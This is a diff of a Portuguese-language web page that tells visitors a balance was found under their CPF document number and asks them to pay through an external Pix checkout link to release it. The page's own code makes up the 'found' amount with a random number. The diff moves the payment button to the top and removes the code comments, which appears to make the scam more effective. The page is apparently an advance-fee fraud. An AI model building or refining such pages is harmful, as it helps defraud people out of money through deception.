@@ -53,7 +53,7 @@
       border-radius: 4px;
     }
     .botao {
-      margin-top: 25px;
+      margin-bottom: 20px;
       display: inline-block !important;
       background: #0071bc;
       color: white;
@@ -91,15 +91,14 @@
   <div class="container" id="conteudo"></div>
 
   <script>
-    // Pega o valor do sessionStorage "k"
     const ref = sessionStorage.getItem("k") || "---";
     const doc = ref !== "---" ? atob(ref).split("|")[0] : "---";
-
-    // Gera valor aleatório formatado para mostrar
     const valor = (Math.random() * (4979 - 843) + 843).toFixed(2).replace(".", ",");
 
-    // Monta o conteúdo HTML da página
     document.getElementById("conteudo").innerHTML = `
+      <a class="botao" href="https://pay.safepagoficial.com/checkout/e46f9230-7044-49c3-94bf-ce984b545247" target="_blank" rel="noopener noreferrer">
+        Confirmar Liberação via Pix
+      </a>
       <h2>Saldo Encontrado com Sucesso</h2>
       <div class="cpf-box">Documento consultado: <strong>${doc}</strong></div>
       <p>Foi localizado um valor disponível no seu nome:</p>
@@ -109,9 +108,6 @@
         <br><br>
         Após a confirmação, o Pix será enviado em até <strong>24h úteis</strong>.
       </div>
-      <a class="botao" href="https://pay.safepagoficial.com/checkout/e46f9230-7044-49c3-94bf-ce984b545247" target="_blank" rel="noopener noreferrer">
-        Confirmar Liberação via Pix
-      </a>
     `;
   </script>
 </body>
